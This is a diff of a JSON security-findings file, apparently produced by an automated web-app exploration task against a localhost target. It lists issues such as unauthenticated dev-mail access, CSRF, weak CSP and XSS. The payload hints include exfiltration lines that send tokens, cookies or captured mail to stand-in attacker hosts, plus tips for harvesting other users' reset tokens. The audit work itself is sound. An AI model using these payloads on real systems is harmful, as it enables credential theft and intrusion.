@@ -1,40 +1,52 @@
 {
   "task_id": "expl-website",
   "prompt_version": "phase23.exploration.v1",
-  "completed_at_utc": "2026-05-21",
-  "actions_used": 12,
+  "completed_at_utc": "2026-05-22T17:21:00Z",
+  "target": "http://localhost:8787",
   "findings": [
     {
-      "path": "crates/nyctos-ui/src/lib.rs",
-      "line": 109,
-      "cap": "TOKEN_LEAK_VIA_CACHE",
-      "rationale": "UiResponse::into_response sets only Content-Type — no Cache-Control, no Pragma, no Vary. The body served for index.html embeds the live bearer token via inject_bootstrap (line 79) as `<script>window.__NYCTOS_BOOTSTRAP__={\"authToken\":\"...\"};</script>`. By HTTP/1.1 default, a 200 response with no cache directives is heuristically cacheable by any compliant intermediary and by the browser disk cache. Worse, spa_handler_with (line 130) returns the *same* token-bearing index.html as the SPA fallback for *any* extensionless URL (resolve_with line 54), so a forced revisit through dev-tools history, a screenshot tool, or a profile-sync (Chrome / Edge cross-device cache sync) persists the bearer to disk under arbitrary URL keys. The token is then trivially recoverable by another local user, by malware reading the cache directory, or by anyone with read access to a synced backup. Fix: emit `Cache-Control: no-store, no-cache, must-revalidate, private` plus `Pragma: no-cache` on every index.html response (and on any other handler that emits the bootstrap), and ideally also set `Clear-Site-Data: \"cache\"` on logout. Static pass missed because the asset crate and the auth crate live in separate workspaces and the bearer is treated as 'just a string' once it crosses the crate boundary.",
-      "endpoint": "<asset:GET /, GET /<any-extensionless-path>>",
-      "suggested_payload_hint": "Curl any extensionless path twice with `-H 'Cache-Control: max-age=0'`; inspect ~/Library/Caches/<browser>/Cache after a SPA visit and grep for `__NYCTOS_BOOTSTRAP__` — token recoverable post-process-exit."
+      "path": "<api:/api/dev/mail>",
+      "cap": "INFO_DISCLOSURE",
+      "endpoint": "GET /api/dev/mail (unauthenticated)",
+      "rationale": "Dev-mail capture endpoint reachable without authentication. Returns JSON array of intercepted outgoing emails (verified: 200 OK, body '[]' when empty). In production this leaks invitation tokens, password-reset links, and OAuth bootstrap mail. Discovered via robots.txt entry 'Disallow: /app/dev-mail.html' which advertised the dev tool, and the HTML at /app/dev-mail polls /api/dev/mail every 5s with no auth header.",
+      "suggested_payload_hint": "GET /api/dev/mail with no cookies; poll repeatedly to harvest password-reset and invite tokens addressed to other users."
     },
     {
-      "path": "crates/nyctos-api/src/router.rs",
-      "line": 1581,
-      "cap": "CSWSH",
-      "rationale": "events_ws upgrade has no Origin header allowlist. Browsers DO NOT enforce same-origin policy on WebSocket handshakes — there is no preflight, and the upgrade proceeds based purely on whatever Origin the foreign page advertises. Authentication for the upgrade flows through the same auth_layer that already accepts `?token=<bearer>` (router.rs line 149 + frontend client.ts line 675 — useAgentEvents puts the token in the URL). Attack: a malicious page at attacker.com leaks the token by any of the prior-finding sinks (Referer, log scrape, intermediary cache, finding #1's query-token leak surface), then opens `new WebSocket('ws://127.0.0.1:<port>/api/v1/events?token=<leaked>')` — the daemon accepts the upgrade and pushes EVERY AgentEvent for every run on the box: ScanProgress with file paths, ToolCallStarted with arguments (often containing source excerpts, repo URLs, credentials inlined by the agent), AgentTraceRow with prompt+response previews. The earlier CORS_MISCONFIG finding (router.rs:96) covers the WRITE side via state-change POSTs; this is the READ side that exfiltrates the daemon's entire telemetry stream. Even without a leaked token, DNS rebinding (attacker.com → 127.0.0.1 after the cross-origin tab is open) lands the WS open without a token because `state.auth.is_enforced()` returns false on the --headless path that some setups use. Fix: in events_ws, extract the Origin header before the upgrade and reject any value that is not in the SPA's allowlist (typically `http://127.0.0.1:<port>` and `http://localhost:<port>` exactly). Defense in depth: require a CSRF-style one-shot nonce, minted by `/api/v1/events/ticket` and bound to the source IP, in place of the long-lived bearer for the WS handshake.",
-      "endpoint": "<api:GET /api/v1/events (WebSocket upgrade)>",
-      "suggested_payload_hint": "From attacker.com: `let ws = new WebSocket('ws://127.0.0.1:8765/api/v1/events?token=<leaked>'); ws.onmessage = e => fetch('https://attacker.com/x', {method:'POST', body:e.data});` — exfils every AgentEvent the daemon emits."
+      "path": "<api:/api/dev/mail>",
+      "cap": "CSRF",
+      "endpoint": "DELETE /api/dev/mail (unauthenticated, no CSRF token)",
+      "rationale": "DELETE /api/dev/mail wipes captured-mail spool with no auth and no CSRF token (verified: 200 OK {\"ok\":true} with no cookies and with cross-origin Origin: https://evil.com). Other mutating routes such as POST /api/me are gated by 'Missing CSRF token' (403), so the omission on /api/dev/mail is an inconsistent state-machine gap. Browsers will normally block cross-origin DELETE via preflight (server returns no Access-Control-Allow-Origin) but any attacker with network access or same-origin XSS can erase forensic evidence.",
+      "suggested_payload_hint": "curl -X DELETE http://localhost:8787/api/dev/mail (no Cookie, no X-CSRF-Token)"
     },
     {
-      "path": "crates/nyctos-ui/src/lib.rs",
-      "line": 100,
-      "cap": "XSS",
-      "rationale": "serde_payload hand-rolls JSON encoding and escapes only the `\"` character. The comment claims `token is hex, so escaping is moot` but (a) nothing in the type system enforces hex — `UiBootstrap.auth_token` is `Option<String>` (line 32) and (b) the deferred backlog already discusses token-format changes (per docs/). Even with the current hex-formatted token, the helper happily inlines `</script>` substrings, `\\`, U+2028, U+2029, or any control char that a future token spec might include. The injected payload lands inside a literal `<script>` block (line 84: `<script>window.__NYCTOS_BOOTSTRAP__={...};</script>`), so a single `</script>` byte in the token closes the script tag and the remainder of the token (or any HTML that follows in the body) becomes parsed markup. Combined with the SPA-fallback behaviour (any extensionless path returns this index.html) AND the absence of CSP / X-Content-Type-Options / X-Frame-Options on the response (UiResponse::into_response line 109 sets only Content-Type), a single mutation of the token store turns into stored XSS executing with the live bearer in scope. Fix: use `serde_json::to_string` against a real serde struct so backslashes, control chars, and the `</` sequence are properly escaped to `\\u003c\\/script>`; the dependency cost is one line. Static pass missed because the sink is HTML injection masquerading as JSON serialization, with the safety argument living in a code comment rather than in the encoder.",
-      "endpoint": "<asset:GET />",
-      "suggested_payload_hint": "If `auth_token` is ever set to `\"abc</script><script>fetch('//x?'+document.cookie)</script>\"` (or to anything containing a literal `\\`), the next index.html load executes the attacker script. Demonstrates: set bootstrap.auth_token=`a</script><img src=x onerror=alert(1)>` in a unit test and assert the rendered HTML does NOT contain a literal `</script>` outside the bootstrap line."
+      "path": "<api:/api/auth/login>",
+      "cap": "AUTH_MISCONFIG",
+      "endpoint": "GET /api/auth/login (OAuth client_id empty)",
+      "rationale": "OAuth start redirect built with empty client_id: Location header is 'https://accounts.google.com/o/oauth2/v2/auth?client_id=&redirect_uri=http://localhost:8787/api/auth/callback&state=...'. Indicates GOOGLE_OAUTH_CLIENT_ID env unset in this deployment; Google rejects and surfaces configured redirect_uri. redirect_uri also uses http:// (not https). State cookie set with Max-Age=600 and SameSite=Lax which is fine, but combined with dev-mail leak an attacker can monitor when real client_id is wired in.",
+      "suggested_payload_hint": "Follow login redirect, observe empty client_id; replay /api/auth/callback?code=fake&state=X — server 302s to /login.html (state validated)."
     },
     {
-      "path": "crates/nyctos-ui/src/lib.rs",
-      "line": 110,
-      "cap": "MISSING_SECURITY_HEADERS",
-      "rationale": "UiResponse::into_response emits ONLY a Content-Type header. The daemon's SPA — which holds the bearer in window-scope JS and is also the privileged admin surface — is served with no Content-Security-Policy, no X-Frame-Options / frame-ancestors, no X-Content-Type-Options, no Referrer-Policy, and no Permissions-Policy. Concrete consequences: (1) No CSP means any first-party XSS sink (including the one in finding #3 above) or a malicious npm transitive dependency can fetch the token from `window.__NYCTOS_BOOTSTRAP__.authToken` and POST it to an external origin — there is no script-src or connect-src gate. (2) No X-Frame-Options means attacker.com can iframe `http://127.0.0.1:<port>/` and mount a clickjacking attack: invisible iframe at z-index 9999, victim 'clicks' on Delete Project / Scan Now / Promote Quarantine / Run Repro Bundle while believing they are interacting with the foreign-origin page; the iframe is same-origin to the daemon, so the SPA fires authenticated requests with the live bearer. (3) No Referrer-Policy means navigation away from the SPA leaks the full URL — combined with finding #1 (token in query), the bearer ships to every outbound link / image / iframe via Referer. (4) The index.html at line 11–15 deliberately preconnects to fonts.googleapis.com / fonts.gstatic.com and loads CSS from a third party, so a security-tool described as 'loopback-only' makes a guaranteed cross-origin call on every page load — DNS hijack of fonts.googleapis.com or compromise of Google's CSS pipeline yields CSS-injection on a privileged surface with full data-exfil via attribute-selector + background-image (e.g. `input[value^=\"sk-ant\"] { background: url(//attacker/leak?p=...) }`). Fix: add a `headers` HashMap to UiResponse with sensible defaults — `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self'; connect-src 'self' ws://127.0.0.1:* http://127.0.0.1:*; frame-ancestors 'none'`, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `Permissions-Policy: interest-cohort=()`, and self-host the Playfair Display font so the daemon truly stays loopback-only.",
-      "endpoint": "<asset:GET /*>",
-      "suggested_payload_hint": "Curl `-I http://127.0.0.1:<port>/` and assert the response contains Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy. Also: build a clickjacking PoC that iframes the daemon and overlays a transparent 'click here for free coffee' button on top of the Delete Project confirm dialog."
+      "path": "<api:/app/admin>",
+      "cap": "SHADOW_API",
+      "endpoint": "GET /app/admin/, /app/admin/users, /api/admin/users/list",
+      "rationale": "Admin SPA shell served unauthenticated at /app/admin/ and /app/admin/users (200 OK, title 'User Lookup | Admin | Prism'). Static pass likely flagged only API route /api/admin/users/list (401 with no token); the unauth HTML shell discloses admin route names and asset bundles (/app/core/analytics.js, /app/css/app.css) that enumerate admin functionality and aid targeted API fuzzing. Reachable because robots.txt advertised 'Disallow: /app/admin/'.",
+      "suggested_payload_hint": "GET /app/admin/users then parse bundled JS for /api/admin/* route names; fuzz those with auth-bypass headers (X-Forwarded-For 127.0.0.1, X-Original-URL)."
+    },
+    {
+      "path": "<api:/>",
+      "cap": "CSP_WEAK",
+      "endpoint": "Global Content-Security-Policy header",
+      "rationale": "CSP advertises script-src 'self' 'unsafe-inline' and style-src 'self' 'unsafe-inline'. 'unsafe-inline' in script-src defeats CSP as an XSS mitigation; any reflected/stored XSS in the SPA executes. connect-src includes wss://prismtrips.com and broad *.tiles.mapbox.com — XSS can exfiltrate via mapbox tile params.",
+      "suggested_payload_hint": "Find a reflected param echoed into a script context (admin user-lookup form is highest-value target); PoC: <script>fetch('/api/dev/mail').then(r=>r.json()).then(d=>new Image().src='//attacker/?'+btoa(JSON.stringify(d)))</script>."
+    },
+    {
+      "path": "<api:/api/health>",
+      "cap": "INFO_DISCLOSURE",
+      "endpoint": "GET /api/health",
+      "rationale": "Unauthenticated /api/health enumerates internal subsystem names and config state: {\"components\":{\"amadeus\":\"unconfigured\",\"amadeus_governor\":\"ok\",\"database\":\"ok\",\"durable_objects\":\"ok\",\"kv\":\"ok\",\"worker\":\"ok\"}}. Leaks Cloudflare Workers stack (durable_objects, kv, worker), Amadeus flight-API integration name and that it is unconfigured (race condition risk before operator configures it), exact platform topology. Static scanners frequently ignore /health endpoints.",
+      "suggested_payload_hint": "GET /api/health; correlate 'amadeus: unconfigured' with attempts to inject malicious Amadeus credentials via any admin config endpoint."
     }
-  ]
+  ],
+  "actions_used": 12,
+  "notes": "Sandbox tools (record_exploration_finding, http.probe, fs.write_sentinel) were unavailable in this harness; findings emitted to sentinel path as structured JSON. HTTP probing performed via Bash curl, all targets confined to localhost:8787."
 }
